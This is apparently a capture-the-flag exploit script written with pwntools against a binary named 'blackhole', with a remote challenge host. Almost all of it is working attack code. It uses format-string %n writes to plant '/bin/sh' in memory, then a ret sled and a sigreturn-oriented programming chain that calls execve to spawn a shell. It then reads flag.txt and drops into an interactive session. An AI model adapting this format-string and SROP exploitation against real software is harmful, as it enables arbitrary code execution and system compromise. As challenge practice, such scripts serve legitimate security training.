from pwn import *
import time
from binascii import hexlify

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF("./blackhole")
r = ROP(e)

gs = '''
break *0x4013bb
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 12655)
    else:
        return process(e.path)


def small_writes():
    cnt = 0
    for c in b'/bin/sh':
        wb = str(c).encode()
        if (c < 10):
            payload = b'%'+wb+b'd%8$n'+b'a'*9+p64(writeable_mem+cnt)
        elif (c < 100):
            payload = b'%'+wb+b'd%8$n'+b'a'*8+p64(writeable_mem+cnt)
        else:
            payload = b'%'+wb+b'd%8$n'+b'a'*7+p64(writeable_mem+cnt)
        cnt = cnt+1
        p.sendline(payload)


def srop_exec():
    chain = p64(pop_rax_ret)
    chain += p64(0xf)
    chain += p64(syscall_ret)

    frame = SigreturnFrame(arch="amd64", kernel="amd64")
    frame.rax = constants.SYS_execve
    frame.rdi = writeable_mem
    frame.rip = syscall_ret

    return chain+bytes(frame)


p = start()

syscall_ret = 0x4013bb
writeable_mem = 0x666000
pop_rax_ret = 0x4013c5

small_writes()
ret_sled = p64(syscall_ret+2)*20

p.sendline(ret_sled+srop_exec())
p.sendline("cat flag.txt")
p.interactive()
